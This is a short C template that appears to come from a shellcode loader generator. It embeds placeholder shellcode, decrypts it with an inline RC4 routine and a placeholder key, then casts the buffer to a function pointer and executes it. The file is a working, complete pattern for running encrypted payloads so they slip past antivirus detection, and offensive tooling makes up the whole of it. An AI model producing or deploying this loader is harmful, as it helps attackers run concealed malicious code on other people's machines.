#define SWAP(x,y) do {     \
    typeof(x) _x = x;      \
    typeof(y) _y = y;      \
    x = _y;                \
    y = _x;                \
} while(0)

// unsigned char bytes[] = "\xb8\x0a\x00\x00\x00\xc3";
unsigned char bytes[] = "{{SHELLCODE}}";
unsigned int len = {{LEN_SHELLCODE}};
unsigned char key[] = "{{KEY}}";

void rc4_encode(unsigned char *bytes, unsigned int len, unsigned char key[16]) {
    unsigned char s[256], k[256];
    unsigned short i, j, t;
    int p;
    j = 0;
    for (i = 0; i < 256; i++) {
        s[i] = (unsigned char)i;
        j &= 0x0f;
        k[i] = key[j];
        j++;
    }
    j = 0; 	for (i = 0; i < 256; i++) {
        j = (j + s[i] + k[i]) % 256;
        SWAP(s[i], s[j]);
    }
    i = 0;
    j = 0;
    for (p = 0; p < len; p++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        SWAP(s[i], s[j]);
        t = (s[i] + (s[j] % 256)) % 256;
        bytes[p] = bytes[p] ^ s[t];
    }
}

int main(int argc, char **argv) {
    rc4_encode(bytes, len, key);
    void (*f)() = (void(*)())bytes;
    f();
}
